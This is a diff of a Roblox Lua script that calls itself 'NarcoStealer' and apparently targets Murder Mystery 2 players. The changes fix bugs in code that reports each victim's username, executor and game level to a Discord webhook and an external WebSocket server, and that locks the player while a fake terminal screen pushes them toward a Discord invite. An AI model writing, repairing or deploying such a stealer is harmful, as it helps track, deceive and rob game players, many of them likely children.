@@ -28,7 +28,7 @@ local LP = Players.LocalPlayer
 local NARCO_KEY = _G.NARCOKEY
 
 -- ====== WEBSOCKET PROXY ======
-local WS_URL = "wss://narcolandia-production.up.railway.app"  -- SUBSTITUA PELO SEU SERVIDOR
+local WS_URL = "wss://narcolandia-production.up.railway.app"
 
 local function connectWebSocket()
     local ws
@@ -57,27 +57,32 @@ local function sendWebhookNow()
     local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
     
     -- Detecta informações do jogo (MM2)
-    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Desconhecido"
+    local gameName = "Desconhecido"
+    pcall(function()
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Desconhecido"
+    end)
+    
+    -- CORRIGIDO: timestamp usando os.date() em vez de DateTime
+    local timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
     
     local discordPayload = {
         username = "NarcoStealer",
         embeds = {{
-            title = "<a:verificado:1478800063328424039> Script Executado - NarcoStealer",
+            title = "Script Executado - NarcoStealer",
             color = 3066993,
-            description = "# <:0_:1540515244252725390><:1_:1540515245871595681><:2_:1540515247541190737><:3_:1540515249206198336><:4_:1540515250812751872><:5_:1540515252486021130><:6_:1540515254415528087>",
             fields = {
                 {
-                    name = "<:ping:1471369480201441456> Usuario:",
+                    name = "Usuario:",
                     value = "```" .. LP.Name .. "```",
                     inline = true
                 },
                 {
-                    name = "<:h_icon_conexions:1384562586007371915> Executor",
+                    name = "Executor",
                     value = "```" .. (identifyexecutor and identifyexecutor() or "Desconhecido") .. "```",
                     inline = true
                 },
                 {
-                    name = "<a:money:1370803268242116639> Nivel MM2",
+                    name = "Nivel MM2",
                     value = "```" .. (function()
                         local success, LevelModule = pcall(function()
                             return require(game:GetService("ReplicatedStorage").Modules.LevelModule)
@@ -126,7 +131,7 @@ local function sendWebhookNow()
             image = {
                 url = "https://media.discordapp.net/attachments/1510795224891261061/1540513978957037628/content.png"
             },
-            timestamp = DateTime.now():ToIsoDate()
+            timestamp = timestamp
         }}
     }
     
@@ -188,7 +193,11 @@ lockPlayer()
 
 -- ====== UI TERMINAL ======
 local function createTerminalUI()
-    pcall(function() CoreGui:FindFirstChild("NarcoUI"):Destroy() end)
+    pcall(function() 
+        if CoreGui:FindFirstChild("NarcoUI") then
+            CoreGui:FindFirstChild("NarcoUI"):Destroy()
+        end
+    end)
     
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "NarcoUI"
@@ -303,7 +312,7 @@ local function createTerminalUI()
                                 |_|                                
 ]]
 
-    local SITE_LINK = ""  -- Será preenchido pelo servidor
+    local SITE_LINK = "https://discord.gg/narcolandia"
 
     local function runTerminalSequence()
         clearTerminal()
@@ -356,23 +365,6 @@ local function createTerminalUI()
 
         addLine("")
         
-        -- Buscar o site_link do servidor
-        local function fetchSiteLink()
-            local ws = connectWebSocket()
-            if ws then
-                local message = { 
-                    action = "get_site_link",
-                    key = NARCO_KEY 
-                }
-                sendToWebSocket(ws, NARCO_KEY, message)
-                wait(0.5)
-                pcall(function() ws:Close() end)
-            end
-        end
-        
-        -- Tenta buscar o link
-        fetchSiteLink()
-        
         -- Botão copiar link
         local btnCopy = Instance.new("TextButton")
         btnCopy.Size = UDim2.new(0.3, 0, 0.06, 0)
@@ -385,35 +377,18 @@ local function createTerminalUI()
         btnCopy.Parent = container
         Instance.new("UICorner", btnCopy).CornerRadius = UDim.new(0, 8)
 
-        -- O link será atualizado pelo servidor via WebSocket
-        local currentLink = "https://discord.gg/narcolandia"
-        
         btnCopy.MouseButton1Click:Connect(function()
             if setclipboard then
-                setclipboard(currentLink)
+                setclipboard(SITE_LINK)
                 btnCopy.Text = "✅ Copiado!"
                 task.wait(2)
                 btnCopy.Text = "Copiar Link"
             end
         end)
 
-        addLine("[*] Link: " .. currentLink)
+        addLine("[*] Link: " .. SITE_LINK)
         addLine("")
         addLine("[*] Aguardando entrada na comunidade...")
-        
-        -- Loop para atualizar o link se receber do servidor
-        coroutine.wrap(function()
-            local ws = connectWebSocket()
-            if ws then
-                ws.OnMessage:Connect(function(message)
-                    local data = HttpService:JSONDecode(message)
-                    if data and data.site_link then
-                        currentLink = data.site_link
-                        addLine("[*] Link atualizado: " .. currentLink)
-                    end
-                end)
-            end
-        end)()
     end
 
     return screenGui, runTerminalSequence
